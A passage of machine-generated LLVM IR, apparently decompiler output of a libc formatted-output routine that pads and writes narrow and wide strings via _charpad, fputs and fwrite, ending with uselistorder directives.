  %v1_804ede9 = add i32 %v0_804eb29.lcssa, 380
  %v2_804ede9 = inttoptr i32 %v1_804ede9 to i32*
  %v3_804ede9 = load i32, i32* %v2_804ede9, align 4
  %v5_804ede9 = add i32 %v0_804eb29.lcssa, -12
  %v6_804ede9 = inttoptr i32 %v5_804ede9 to i32*
  store i32 %v3_804ede9, i32* %v6_804ede9, align 4
  %v1_804edf0 = add i32 %v0_804eb29.lcssa, -16
  %v2_804edf0 = inttoptr i32 %v1_804edf0 to i32*
  store i32 ptrtoint (i32* @global_var_804edf7.126 to i32), i32* %v2_804edf0, align 4
  %v3_804edf0 = load i32, i32* %edx.global-to-local, align 4
  %v4_804edf0 = mul i32 %v3_804edf0, 4
  %v5_804edf0 = add i32 %v4_804edf0, ptrtoint (i32* @global_var_8055bcc.127 to i32)
  %v6_804edf0 = inttoptr i32 %v5_804edf0 to i32*
  %v7_804edf0 = load i32, i32* %v6_804edf0, align 4
  call void @__pseudo_call(i32 %v7_804edf0)
  %v0_804edf7 = load i32, i32* @esp, align 4
  %v1_804edf7 = add i32 %v0_804edf7, 12
  %v0_804edfa.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804edfa

dec_label_pc_804edfa:                             ; preds = %dec_label_pc_804ec46, %dec_label_pc_804edc6
  %v3_804ee02 = phi i32 [ %v0_804ec5d, %dec_label_pc_804ec46 ], [ %v0_804edfa.pre, %dec_label_pc_804edc6 ]
  %v20_804ee02 = phi i32 [ %v1_804ec62, %dec_label_pc_804ec46 ], [ %v1_804edf7, %dec_label_pc_804edc6 ]
  %v2_804edfa = icmp slt i32 %v3_804ee02, 0
  br i1 %v2_804edfa, label %dec_label_pc_804ef83, label %dec_label_pc_804ee02

dec_label_pc_804ee02:                             ; preds = %dec_label_pc_804edfa
  %v1_804ee02 = inttoptr i32 %v20_804ee02 to i32*
  %v2_804ee02 = load i32, i32* %v1_804ee02, align 4
  %v4_804ee02 = add i32 %v2_804ee02, %v3_804ee02
  store i32 %v4_804ee02, i32* %v1_804ee02, align 4
  %v0_804ef70.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ef70

dec_label_pc_804ee15:                             ; preds = %dec_label_pc_804ecaa
  store i32 0, i32* @ebp, align 4
  store i32 11, i32* @edi, align 4
  %v1_804ee1c = add i32 %v0_804ecc3, 23
  %v2_804ee1c = inttoptr i32 %v1_804ee1c to i8*
  store i8 32, i8* %v2_804ee1c, align 1
  store i32 0, i32* @ebx, align 4
  br label %dec_label_pc_804ee23

dec_label_pc_804ee23:                             ; preds = %dec_label_pc_804ed70, %dec_label_pc_804ed5a, %dec_label_pc_804ed33, %dec_label_pc_804ec24, %dec_label_pc_804ec1d, %dec_label_pc_804ee15
  %v0_804ee23 = load i32, i32* @ebp, align 4
  %v1_804ee23 = load i32, i32* @esi, align 4
  %v2_804ee23 = add i32 %v1_804ee23, %v0_804ee23
  store i32 %v2_804ee23, i32* %edx.global-to-local, align 4
  %v0_804ee27 = load i32, i32* @edi, align 4
  %v9_804ee27 = icmp eq i32 %v0_804ee27, 11
  br i1 %v9_804ee27, label %dec_label_pc_804ee38, label %dec_label_pc_804ee2c

dec_label_pc_804ee2c:                             ; preds = %dec_label_pc_804ee23
  %v1_804ee2e = add i32 %v0_804ee27, -5
  %v6_804ee2e = sub i32 4, %v0_804ee27
  %v7_804ee2e = and i32 %v6_804ee2e, %v0_804ee27
  %v8_804ee2e = icmp slt i32 %v7_804ee2e, 0
  %v9_804ee2e = icmp eq i32 %v1_804ee2e, 0
  %v10_804ee2e = icmp slt i32 %v1_804ee2e, 0
  %v3_804ee31 = icmp eq i1 %v10_804ee2e, %v8_804ee2e
  %v4_804ee31 = icmp eq i1 %v9_804ee2e, false
  %v5_804ee31 = and i1 %v4_804ee31, %v3_804ee31
  %v6_804ee31 = zext i1 %v5_804ee31 to i32
  store i32 %v6_804ee31, i32* %eax.global-to-local, align 4
  %v2_804ee34 = add i32 %v2_804ee23, 1
  %v3_804ee34 = add i32 %v2_804ee34, %v6_804ee31
  store i32 %v3_804ee34, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee38

dec_label_pc_804ee38:                             ; preds = %dec_label_pc_804ee23, %dec_label_pc_804ee2c
  %v0_804ee38 = load i32, i32* @esp, align 4
  %v1_804ee38 = add i32 %v0_804ee38, 20
  %v2_804ee38 = inttoptr i32 %v1_804ee38 to i32*
  %v3_804ee38 = load i32, i32* %v2_804ee38, align 4
  store i32 %v3_804ee38, i32* %eax.global-to-local, align 4
  %v1_804ee3c = add i32 %v0_804ee38, 8
  %v2_804ee3c = inttoptr i32 %v1_804ee3c to i32*
  store i32 0, i32* %v2_804ee3c, align 4
  %v0_804ee44 = load i32, i32* %eax.global-to-local, align 4
  %v1_804ee44 = load i32, i32* %edx.global-to-local, align 4
  %v2_804ee44 = sub i32 %v0_804ee44, %v1_804ee44
  %v7_804ee44 = icmp ult i32 %v0_804ee44, %v1_804ee44
  %v12_804ee44 = icmp eq i32 %v2_804ee44, 0
  %v2_804ee46 = or i1 %v7_804ee44, %v12_804ee44
  br i1 %v2_804ee46, label %dec_label_pc_804ee4e, label %dec_label_pc_804ee48

dec_label_pc_804ee48:                             ; preds = %dec_label_pc_804ee38
  store i32 %v2_804ee44, i32* %eax.global-to-local, align 4
  %v1_804ee4a = load i32, i32* @esp, align 4
  %v2_804ee4a = add i32 %v1_804ee4a, 8
  %v3_804ee4a = inttoptr i32 %v2_804ee4a to i32*
  store i32 %v2_804ee44, i32* %v3_804ee4a, align 4
  %v0_804ee51.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ee4e

dec_label_pc_804ee4e:                             ; preds = %dec_label_pc_804ee38, %dec_label_pc_804ee48
  %v0_804ee51 = phi i32 [ %v1_804ee44, %dec_label_pc_804ee38 ], [ %v0_804ee51.pre, %dec_label_pc_804ee48 ]
  %v0_804ee4e = load i32, i32* @esp, align 4
  %v1_804ee4e = inttoptr i32 %v0_804ee4e to i32*
  %v2_804ee4e = load i32, i32* %v1_804ee4e, align 4
  %v2_804ee51 = add i32 %v2_804ee4e, %v0_804ee51
  store i32 %v2_804ee51, i32* %eax.global-to-local, align 4
  %v2_804ee54 = add i32 %v0_804ee4e, 8
  %v3_804ee54 = inttoptr i32 %v2_804ee54 to i32*
  %v4_804ee54 = load i32, i32* %v3_804ee54, align 4
  %v5_804ee54 = add i32 %v4_804ee54, %v2_804ee51
  store i32 %v5_804ee54, i32* %eax.global-to-local, align 4
  store i32 %v5_804ee54, i32* %v1_804ee4e, align 4
  %v0_804ee5b = load i32, i32* @esp, align 4
  %v1_804ee5b = add i32 %v0_804ee5b, 7
  %v2_804ee5b = inttoptr i32 %v1_804ee5b to i8*
  %v3_804ee5b = load i8, i8* %v2_804ee5b, align 1
  %v9_804ee5b = icmp eq i8 %v3_804ee5b, 48
  %v1_804ee60 = icmp eq i1 %v9_804ee5b, false
  br i1 %v1_804ee60, label %dec_label_pc_804ee6e, label %dec_label_pc_804ee62

dec_label_pc_804ee62:                             ; preds = %dec_label_pc_804ee4e
  %v0_804ee62 = load i32, i32* @ebp, align 4
  %v2_804ee62 = add i32 %v0_804ee5b, 8
  %v3_804ee62 = inttoptr i32 %v2_804ee62 to i32*
  %v4_804ee62 = load i32, i32* %v3_804ee62, align 4
  %v5_804ee62 = add i32 %v4_804ee62, %v0_804ee62
  store i32 %v5_804ee62, i32* @ebp, align 4
  store i32 0, i32* %v3_804ee62, align 4
  %v0_804ee6e.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee6e

dec_label_pc_804ee6e:                             ; preds = %dec_label_pc_804ee4e, %dec_label_pc_804ee62
  %v0_804ee75 = phi i32 [ %v0_804ee5b, %dec_label_pc_804ee4e ], [ %v0_804ee6e.pre, %dec_label_pc_804ee62 ]
  %v1_804ee6e = add i32 %v0_804ee75, 28
  %v2_804ee6e = inttoptr i32 %v1_804ee6e to i8*
  %v3_804ee6e = load i8, i8* %v2_804ee6e, align 1
  %v4_804ee6e = and i8 %v3_804ee6e, 8
  %v5_804ee6e = icmp eq i8 %v4_804ee6e, 0
  %v1_804ee73 = icmp eq i1 %v5_804ee6e, false
  br i1 %v1_804ee73, label %dec_label_pc_804ee9c, label %dec_label_pc_804ee75

dec_label_pc_804ee75:                             ; preds = %dec_label_pc_804ee6e
  %v1_804ee75 = add i32 %v0_804ee75, 8
  %v2_804ee75 = inttoptr i32 %v1_804ee75 to i32*
  %v3_804ee75 = load i32, i32* %v2_804ee75, align 4
  store i32 %v3_804ee75, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ee7e = add i32 %v0_804ee75, 380
  %v2_804ee7e = inttoptr i32 %v1_804ee7e to i32*
  %v3_804ee7e = load i32, i32* %v2_804ee7e, align 4
  store i32 %v3_804ee7e, i32* @eax, align 4
  %v0_804ee85 = call i32 @_charpad()
  store i32 %v0_804ee85, i32* %eax.global-to-local, align 4
  %v1_804ee8a = load i32, i32* @esp, align 4
  %v2_804ee8a = add i32 %v1_804ee8a, 8
  %v3_804ee8a = inttoptr i32 %v2_804ee8a to i32*
  %v4_804ee8a = load i32, i32* %v3_804ee8a, align 4
  %v15_804ee8a = icmp eq i32 %v0_804ee85, %v4_804ee8a
  %v1_804ee8e = icmp eq i1 %v15_804ee8a, false
  br i1 %v1_804ee8e, label %dec_label_pc_804ef83, label %dec_label_pc_804ee94

dec_label_pc_804ee94:                             ; preds = %dec_label_pc_804ee75
  store i32 0, i32* %v3_804ee8a, align 4
  %v0_804ee9c.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_804ee9c

dec_label_pc_804ee9c:                             ; preds = %dec_label_pc_804ee6e, %dec_label_pc_804ee94
  %v0_804ee9c = phi i32 [ %v0_804ee75, %dec_label_pc_804ee6e ], [ %v0_804ee9c.pre, %dec_label_pc_804ee94 ]
  %v1_804ee9c = add i32 %v0_804ee9c, 380
  %v2_804ee9c = inttoptr i32 %v1_804ee9c to i32*
  %v3_804ee9c = load i32, i32* %v2_804ee9c, align 4
  %v5_804ee9c = add i32 %v0_804ee9c, -4
  %v6_804ee9c = inttoptr i32 %v5_804ee9c to i32*
  store i32 %v3_804ee9c, i32* %v6_804ee9c, align 4
  %v0_804eea3 = load i32, i32* @edi, align 4
  %v1_804eea3 = add i32 %v0_804eea3, ptrtoint (i32* @global_var_8051324.128 to i32)
  store i32 %v1_804eea3, i32* %eax.global-to-local, align 4
  %v2_804eea9 = add i32 %v0_804ee9c, -8
  %v3_804eea9 = inttoptr i32 %v2_804eea9 to i32*
  store i32 %v1_804eea3, i32* %v3_804eea9, align 4
  %v0_804eeaa = call i32 @__GI_fputs_unlocked()
  store i32 %v0_804eeaa, i32* %eax.global-to-local, align 4
  %v0_804eeaf = load i32, i32* @ebp, align 4
  store i32 %v0_804eeaf, i32* @ecx, align 4
  store i32 48, i32* @edx, align 4
  %v0_804eeb6 = load i32, i32* @esp, align 4
  %v1_804eeb6 = add i32 %v0_804eeb6, 388
  %v2_804eeb6 = inttoptr i32 %v1_804eeb6 to i32*
  %v3_804eeb6 = load i32, i32* %v2_804eeb6, align 4
  store i32 %v3_804eeb6, i32* @eax, align 4
  %v0_804eebd = call i32 @_charpad()
  store i32 %v0_804eebd, i32* %eax.global-to-local, align 4
  %v0_804eec2 = load i32, i32* @esp, align 4
  %v1_804eec2 = inttoptr i32 %v0_804eec2 to i32*
  %v2_804eec2 = load i32, i32* %v1_804eec2, align 4
  store i32 %v2_804eec2, i32* @edi, align 4
  %v3_804eec2 = add i32 %v0_804eec2, 4
  %v1_804eec3 = inttoptr i32 %v3_804eec2 to i32*
  %v2_804eec3 = load i32, i32* %v1_804eec3, align 4
  store i32 %v2_804eec3, i32* %edx.global-to-local, align 4
  %v3_804eec3 = add i32 %v0_804eec2, 8
  %v1_804eec4 = load i32, i32* @ebp, align 4
  %v12_804eec4 = icmp eq i32 %v0_804eebd, %v1_804eec4
  %v1_804eec6 = icmp eq i1 %v12_804eec4, false
  br i1 %v1_804eec6, label %dec_label_pc_804ef83, label %dec_label_pc_804eecc

dec_label_pc_804eecc:                             ; preds = %dec_label_pc_804ee9c
  %v1_804eecc = add i32 %v0_804eec2, 364
  %v2_804eecc = inttoptr i32 %v1_804eecc to i32*
  %v3_804eecc = load i32, i32* %v2_804eecc, align 4
  %v4_804eecc = icmp eq i32 %v3_804eecc, 0
  %v1_804eed4 = icmp eq i1 %v4_804eecc, false
  br i1 %v1_804eed4, label %dec_label_pc_804eef5, label %dec_label_pc_804eed6

dec_label_pc_804eed6:                             ; preds = %dec_label_pc_804eecc
  %v0_804eed6 = load i32, i32* @esi, align 4
  %v1_804eed6 = icmp eq i32 %v0_804eed6, 0
  br i1 %v1_804eed6, label %dec_label_pc_804ef55, label %dec_label_pc_804eeda

dec_label_pc_804eeda:                             ; preds = %dec_label_pc_804eed6
  %v1_804eeda = add i32 %v0_804eec2, 388
  %v2_804eeda = inttoptr i32 %v1_804eeda to i32*
  %v3_804eeda = load i32, i32* %v2_804eeda, align 4
  store i32 %v3_804eeda, i32* %v1_804eec3, align 4
  %v0_804eee1 = load i32, i32* @esi, align 4
  store i32 %v0_804eee1, i32* %v1_804eec2, align 4
  %v0_804eee2 = load i32, i32* @ebx, align 4
  %v2_804eee2 = add i32 %v0_804eec2, -4
  %v3_804eee2 = inttoptr i32 %v2_804eee2 to i32*
  store i32 %v0_804eee2, i32* %v3_804eee2, align 4
  %v0_804eee3 = load i32, i32* %stack_var_-376, align 4
  %v3_804eee3 = inttoptr i32 %v0_804eee3 to i8*
  %v4_804eee3 = call i32 @__stdio_fwrite(i8* %v3_804eee3, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804eee3, i32* %eax.global-to-local, align 4
  %v0_804eee8 = load i32, i32* @esp, align 4
  %v1_804eee8 = add i32 %v0_804eee8, 12
  %v1_804eeeb = load i32, i32* @esi, align 4
  %v12_804eeeb = icmp eq i32 %v4_804eee3, %v1_804eeeb
  %v1_804eeed = icmp eq i1 %v12_804eeeb, false
  br i1 %v1_804eeed, label %dec_label_pc_804ef83, label %dec_label_pc_804ef55

dec_label_pc_804eef5:                             ; preds = %dec_label_pc_804eecc
  %v1_804eef5 = add i32 %v0_804eec2, 356
  %v2_804eef5 = inttoptr i32 %v1_804eef5 to i32*
  store i32 0, i32* %v2_804eef5, align 4
  %v0_804ef00 = load i32, i32* @esp, align 4
  %v1_804ef00 = add i32 %v0_804ef00, 356
  store i32 %v1_804ef00, i32* @ebp, align 4
  %v0_804ef5117 = load i32, i32* @esi, align 4
  %v1_804ef5118 = icmp eq i32 %v0_804ef5117, 0
  %v1_804ef5325 = icmp eq i1 %v1_804ef5118, false
  br i1 %v1_804ef5325, label %dec_label_pc_804ef09, label %dec_label_pc_804ef55

dec_label_pc_804ef09:                             ; preds = %dec_label_pc_804eef5, %dec_label_pc_804ef4f
  %v0_804ef18 = phi i32 [ %v0_804ef1852, %dec_label_pc_804ef4f ], [ %v0_804ef00, %dec_label_pc_804eef5 ]
  %v0_804ef09 = phi i32 [ %v2_804ef4f, %dec_label_pc_804ef4f ], [ %v0_804ef5117, %dec_label_pc_804eef5 ]
  %tmp106 = icmp ult i32 %v0_804ef09, 129
  br i1 %tmp106, label %dec_label_pc_804ef18, label %dec_label_pc_804ef13

dec_label_pc_804ef13:                             ; preds = %dec_label_pc_804ef09
  br label %dec_label_pc_804ef18

dec_label_pc_804ef18:                             ; preds = %dec_label_pc_804ef09, %dec_label_pc_804ef13
  %storemerge107 = phi i32 [ 128, %dec_label_pc_804ef13 ], [ %v0_804ef09, %dec_label_pc_804ef09 ]
  store i32 %storemerge107, i32* %eax.global-to-local, align 4
  %v1_804ef18 = add i32 %v0_804ef18, 348
  store i32 %v1_804ef18, i32* %edx.global-to-local, align 4
  %v2_804ef1f = add i32 %v0_804ef18, -4
  %v3_804ef1f = inttoptr i32 %v2_804ef1f to i32*
  store i32 %v1_804ef18, i32* %v3_804ef1f, align 4
  %v0_804ef20 = load i32, i32* %eax.global-to-local, align 4
  %v2_804ef20 = add i32 %v0_804ef18, -8
  %v3_804ef20 = inttoptr i32 %v2_804ef20 to i32*
  store i32 %v0_804ef20, i32* %v3_804ef20, align 4
  %v0_804ef21 = load i32, i32* @ebp, align 4
  %v2_804ef21 = add i32 %v0_804ef18, -12
  %v3_804ef21 = inttoptr i32 %v2_804ef21 to i32*
  store i32 %v0_804ef21, i32* %v3_804ef21, align 4
  %v1_804ef22 = add i32 %v0_804ef18, 200
  store i32 %v1_804ef22, i32* @edi, align 4
  %v2_804ef29 = add i32 %v0_804ef18, -16
  %v3_804ef29 = inttoptr i32 %v2_804ef29 to i32*
  store i32 %v1_804ef22, i32* %v3_804ef29, align 4
  %v0_804ef2a = call i32 @__GI_wcsrtombs()
  store i32 %v0_804ef2a, i32* @ebx, align 4
  %v0_804ef31 = load i32, i32* @esp, align 4
  %v1_804ef31 = add i32 %v0_804ef31, 16
  store i32 0, i32* %eax.global-to-local, align 4
  %v1_804ef36 = icmp eq i32 %v0_804ef2a, 0
  br i1 %v1_804ef36, label %dec_label_pc_804ef4f, label %dec_label_pc_804ef3a

dec_label_pc_804ef3a:                             ; preds = %dec_label_pc_804ef18
  %v1_804ef3a = add i32 %v0_804ef31, 396
  %v2_804ef3a = inttoptr i32 %v1_804ef3a to i32*
  %v3_804ef3a = load i32, i32* %v2_804ef3a, align 4
  %v5_804ef3a = add i32 %v0_804ef31, 12
  %v6_804ef3a = inttoptr i32 %v5_804ef3a to i32*
  store i32 %v3_804ef3a, i32* %v6_804ef3a, align 4
  %v2_804ef41 = add i32 %v0_804ef31, 8
  %v3_804ef41 = inttoptr i32 %v2_804ef41 to i32*
  store i32 %v0_804ef2a, i32* %v3_804ef41, align 4
  %v0_804ef42 = load i32, i32* @edi, align 4
  %v2_804ef42 = add i32 %v0_804ef31, 4
  %v3_804ef42 = inttoptr i32 %v2_804ef42 to i32*
  store i32 %v0_804ef42, i32* %v3_804ef42, align 4
  %v0_804ef43 = load i32, i32* %stack_var_-376, align 4
  %v3_804ef43 = inttoptr i32 %v0_804ef43 to i8*
  %v4_804ef43 = call i32 @__stdio_fwrite(i8* %v3_804ef43, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804ef43, i32* %eax.global-to-local, align 4
  %v0_804ef48 = load i32, i32* @esp, align 4
  %v1_804ef48 = add i32 %v0_804ef48, 12
  %v12_804ef4b = icmp eq i32 %v4_804ef43, %v0_804ef2a
  %v1_804ef4d = icmp eq i1 %v12_804ef4b, false
  br i1 %v1_804ef4d, label %dec_label_pc_804ef83, label %dec_label_pc_804ef4f

dec_label_pc_804ef4f:                             ; preds = %dec_label_pc_804ef3a, %dec_label_pc_804ef18
  %v1_804ef4f = phi i32 [ %v4_804ef43, %dec_label_pc_804ef3a ], [ 0, %dec_label_pc_804ef18 ]
  %v0_804ef1852 = phi i32 [ %v1_804ef48, %dec_label_pc_804ef3a ], [ %v1_804ef31, %dec_label_pc_804ef18 ]
  %v0_804ef4f = load i32, i32* @esi, align 4
  %v2_804ef4f = sub i32 %v0_804ef4f, %v1_804ef4f
  %v12_804ef4f = icmp eq i32 %v2_804ef4f, 0
  store i32 %v2_804ef4f, i32* @esi, align 4
  %v1_804ef53 = icmp eq i1 %v12_804ef4f, false
  br i1 %v1_804ef53, label %dec_label_pc_804ef09, label %dec_label_pc_804ef55

dec_label_pc_804ef55:                             ; preds = %dec_label_pc_804ef4f, %dec_label_pc_804eef5, %dec_label_pc_804eeda, %dec_label_pc_804eed6
  %v0_804ef55 = phi i32 [ %v1_804eee8, %dec_label_pc_804eeda ], [ %v3_804eec3, %dec_label_pc_804eed6 ], [ %v0_804ef00, %dec_label_pc_804eef5 ], [ %v0_804ef1852, %dec_label_pc_804ef4f ]
  %v1_804ef55 = add i32 %v0_804ef55, 8
  %v2_804ef55 = inttoptr i32 %v1_804ef55 to i32*
  %v3_804ef55 = load i32, i32* %v2_804ef55, align 4
  store i32 %v3_804ef55, i32* @ecx, align 4
  store i32 32, i32* @edx, align 4
  %v1_804ef5e = add i32 %v0_804ef55, 380
  %v2_804ef5e = inttoptr i32 %v1_804ef5e to i32*
  %v3_804ef5e = load i32, i32* %v2_804ef5e, align 4
  store i32 %v3_804ef5e, i32* @eax, align 4
  %v0_804ef65 = call i32 @_charpad()
  store i32 %v0_804ef65, i32* %eax.global-to-local, align 4
  %v1_804ef6a = load i32, i32* @esp, align 4
  %v2_804ef6a = add i32 %v1_804ef6a, 8
  %v3_804ef6a = inttoptr i32 %v2_804ef6a to i32*
  %v4_804ef6a = load i32, i32* %v3_804ef6a, align 4
  %v15_804ef6a = icmp eq i32 %v0_804ef65, %v4_804ef6a
  %v1_804ef6e = icmp eq i1 %v15_804ef6a, false
  br i1 %v1_804ef6e, label %dec_label_pc_804ef83, label %dec_label_pc_804ef70

dec_label_pc_804ef70:                             ; preds = %dec_label_pc_804ef55, %dec_label_pc_804ee02, %dec_label_pc_804eaa8
  %v0_804ef70 = phi i32 [ %v1_804ef6a, %dec_label_pc_804ef55 ], [ %v0_804ef70.pre, %dec_label_pc_804ee02 ], [ %v1_804eac6, %dec_label_pc_804eaa8 ]
  %v1_804ef70 = add i32 %v0_804ef70, 12
  %v2_804ef70 = inttoptr i32 %v1_804ef70 to i32*
  %v3_804ef70 = load i32, i32* %v2_804ef70, align 4
  store i32 %v3_804ef70, i32* @ebx, align 4
  store i32 %v3_804ef70, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804ea05.backedge

dec_label_pc_804ef7b:                             ; preds = %dec_label_pc_804ea42
  %v1_804ef7b = add i32 %v0_804ef7b, 2
  store i32 %v1_804ef7b, i32* @ebx, align 4
  br label %dec_label_pc_804ea05.backedge

dec_label_pc_804ef83:                             ; preds = %dec_label_pc_804ea2e, %dec_label_pc_804ecaa, %dec_label_pc_804ef55, %dec_label_pc_804eeda, %dec_label_pc_804ee9c, %dec_label_pc_804ee75, %dec_label_pc_804edfa, %dec_label_pc_804ecd4, %dec_label_pc_804ef3a
  %v0_804ef83 = phi i32 [ %v1_804ef48, %dec_label_pc_804ef3a ], [ %v0_804ef83.pre.pre, %dec_label_pc_804ea2e ], [ %v1_804ecc3, %dec_label_pc_804ecaa ], [ %v1_804ef6a, %dec_label_pc_804ef55 ], [ %v1_804eee8, %dec_label_pc_804eeda ], [ %v3_804eec3, %dec_label_pc_804ee9c ], [ %v1_804ee8a, %dec_label_pc_804ee75 ], [ %v20_804ee02, %dec_label_pc_804edfa ], [ %v1_804eced, %dec_label_pc_804ecd4 ]
  %v1_804ef83 = inttoptr i32 %v0_804ef83 to i32*
  store i32 -1, i32* %v1_804ef83, align 4
  br label %dec_label_pc_804ef8a

dec_label_pc_804ef8a:                             ; preds = %dec_label_pc_804ea39, %dec_label_pc_804e9b1, %dec_label_pc_804e9cb, %dec_label_pc_804ef83
  %v0_804ef8a = load i32, i32* @esp, align 4
  %v1_804ef8a = inttoptr i32 %v0_804ef8a to i32*
  %v2_804ef8a = load i32, i32* %v1_804ef8a, align 4
  store i32 %v2_804ef8a, i32* %eax.global-to-local, align 4
  %v1_804ef8d = add i32 %v0_804ef8a, 360
  %v1_804ef93 = inttoptr i32 %v1_804ef8d to i32*
  %v2_804ef93 = load i32, i32* %v1_804ef93, align 4
  store i32 %v2_804ef93, i32* @ebx, align 4
  %v3_804ef95 = add i32 %v0_804ef8a, 372
  %v1_804ef96 = inttoptr i32 %v3_804ef95 to i32*
  %v2_804ef96 = load i32, i32* %v1_804ef96, align 4
  store i32 %v2_804ef96, i32* @ebp, align 4
  ret i32 %v2_804ef8a

; uselistorder directives
  uselistorder i32 %v1_804ef7b, { 1, 0 }
  uselistorder i32 %v3_804ef70, { 2, 3, 0, 1 }
  uselistorder i32 %v0_804ef55, { 1, 0 }
  uselistorder i32 %v2_804ef4f, { 1, 2, 0 }
  uselistorder i32 %v4_804ef43, { 1, 0, 2 }
  uselistorder i32 %v0_804ef2a, { 0, 2, 1, 3 }
  uselistorder i32 %v0_804ef18, { 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_804ef00, { 1, 0, 2 }
  uselistorder i32 %v0_804ee9c, { 2, 1, 0 }
  uselistorder i32 %v0_804ee75, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804ee44, { 1, 0, 2 }
  uselistorder i32 %v6_804ee31, { 1, 0 }
  uselistorder i32 %v1_804ee2e, { 1, 0 }
  uselistorder i32 %v0_804ee27, { 0, 3, 2, 1 }
  uselistorder i32 %v1_804ed28, { 1, 0, 2 }
  uselistorder i32 %v2_804ed70, { 2, 3, 1, 0 }
  uselistorder i32 %v0_804ed44.pre, { 0, 2, 3, 4, 5, 6, 7, 1 }
  uselistorder i32 %v0_804ec7e, { 4, 3, 2, 1, 0, 5, 6, 7 }
  uselistorder i32 %v0_804ec24, { 1, 0, 2 }
  uselistorder i32 %v2_804eba9, { 2, 3, 1, 4, 0 }
  uselistorder i32 %v0_804ebfe, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v0_804ebef, { 1, 2, 0 }
  uselistorder i32 %v3_804eb8d, { 0, 1, 3, 2 }
  uselistorder i32 %v1_804eb56, { 2, 1, 0, 3, 4 }
  uselistorder i32 %v4_804ead7, { 1, 2, 0 }
  uselistorder i32 %v3_804eaa0, { 4, 6, 5, 7, 8, 0, 1, 2, 3, 10, 9, 11, 12 }
  uselistorder i32 %v0_804eb29.lcssa, { 5, 6, 7, 8, 9, 10, 11, 14, 29, 13, 12, 15, 28, 27, 18, 19, 20, 21, 17, 16, 23, 22, 26, 25, 24, 1, 2, 3, 4, 0 }
  uselistorder i32 %v5_804ea9a, { 1, 0 }
  uselistorder i32 %v1_804ea9a.pre, { 0, 2, 1 }
  uselistorder i32 %v1_804ea99, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 %v1_804ea96, { 1, 0 }
  uselistorder i32 %v5_804ea9a85, { 1, 0 }
  uselistorder i32 %v3_804ea84, { 1, 0 }
  uselistorder i32 %v0_804ea72, { 0, 1, 2, 3, 4, 6, 5, 7 }
  uselistorder i32 %v1_804ea42, { 0, 2, 3, 1 }
  uselistorder i32 %v0_804ea13, { 0, 1, 3, 2 }
  uselistorder i32 %v0_804e9f6, { 1, 0, 2 }
  uselistorder i32 %v2_804e9a1, { 1, 0, 3, 2, 4 }
  uselistorder i32* %stack_var_-376, { 3, 2, 6, 0, 5, 4, 1, 7, 8, 9 }
  uselistorder i32* %stack_var_-364, { 1, 0, 2 }
  uselistorder i32* %edx.global-to-local, { 3, 4, 5, 8, 7, 6, 9, 10, 11, 12, 2, 13, 14, 1, 15, 16, 0, 18, 17, 19, 20, 25, 21, 22, 23, 26, 24, 27, 28, 29, 30, 31 }
  uselistorder i32* %eax.global-to-local, { 1, 2, 3, 4, 5, 0, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 33, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 64, 65, 66, 51, 52, 53, 54, 55, 56, 57, 59, 58, 60, 61, 62, 63 }
  uselistorder i32 372, { 1, 0 }
  uselistorder i32 360, { 1, 2, 0 }
  uselistorder i32 364, { 1, 4, 3, 0, 2 }
  uselistorder i32 ()* @_charpad, { 2, 1, 0, 3 }
  uselistorder i32 201, { 1, 0 }
  uselistorder i32 19, { 0, 2, 3, 4, 5, 6, 1 }
  uselistorder i32 200, { 2, 0, 4, 5, 1, 3 }
  uselistorder i32 ()* @__GI_wcsrtombs, { 1, 0 }
  uselistorder i32 348, { 1, 2, 3, 4, 0, 5, 6 }
  uselistorder i32 -24, { 0, 5, 1, 2, 3, 4 }
  uselistorder i32 29, { 1, 0 }
  uselistorder i32 60, { 0, 7, 8, 2, 9, 10, 4, 6, 5, 3, 1 }
  uselistorder i32 -20, { 1, 2, 0, 3, 4, 5, 6, 7 }
  uselistorder i32 55, { 1, 0 }
  uselistorder i32 87, { 1, 0 }
  uselistorder i32 -16, { 3, 1, 2, 4, 0, 5, 6, 27, 19, 13, 14, 10, 11, 12, 15, 9, 16, 17, 18, 7, 8, 20, 21, 22, 23, 24, 25, 26 }
  uselistorder i32 328, { 1, 2, 3, 4, 5, 0, 6 }
  uselistorder i32 88, { 0, 2, 3, 4, 1 }
  uselistorder i32 100, { 1, 0, 2 }
  uselistorder i32 58, { 4, 5, 3, 0, 1, 2 }
  uselistorder i32 356, { 1, 0, 2, 3, 4 }
  uselistorder i32 380, { 2, 3, 4, 1, 0, 5, 6, 7 }
  uselistorder label %dec_label_pc_804ef8a, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_804ef83, { 2, 8, 3, 4, 5, 6, 7, 1, 0 }
  uselistorder label %dec_label_pc_804ef18, { 1, 0 }
  uselistorder label %dec_label_pc_804ef09, { 1, 0 }
  uselistorder label %dec_label_pc_804ee9c, { 1, 0 }
  uselistorder label %dec_label_pc_804ee6e, { 1, 0 }
  uselistorder label %dec_label_pc_804ee4e, { 1, 0 }
  uselistorder label %dec_label_pc_804ee38, { 1, 0 }
  uselistorder label %dec_label_pc_804ee23, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_804edfa, { 1, 0 }
  uselistorder label %dec_label_pc_804ed44, { 1, 0 }
  uselistorder label %dec_label_pc_804ed33, { 1, 0 }
  uselistorder label %dec_label_pc_804ed28, { 1, 0 }
  uselistorder label %dec_label_pc_804ed1b, { 1, 0 }
  uselistorder label %dec_label_pc_804ecaa, { 1, 0 }
